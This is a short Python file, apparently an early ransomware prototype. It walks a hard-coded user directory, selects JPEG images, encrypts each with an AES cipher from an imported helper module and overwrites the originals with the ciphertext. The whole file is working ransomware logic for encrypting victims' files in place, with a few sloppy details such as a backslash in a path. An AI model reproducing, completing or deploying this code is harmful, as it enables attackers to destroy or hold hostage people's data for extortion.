import os
import body

encryption_ext=('.jpeg','.jpg')
def encryption(Key):
    aes=body.AESCipher(Key)
    file_paths=[]
    for root, dirs, files in os.walk('/Users/shashank/Ransomware'):
        for file in files:
            file_paths, file_ext = os.path.splitext(root+'\\'+file)
            if file_ext in encryption_ext:
                print(file)
                fileq=open(os.path.join(root,file),"rb")
                out=aes.encrypt(fileq.read())
                open(os.path.join(root,file), "wb").write(bytes(out,'utf-8'))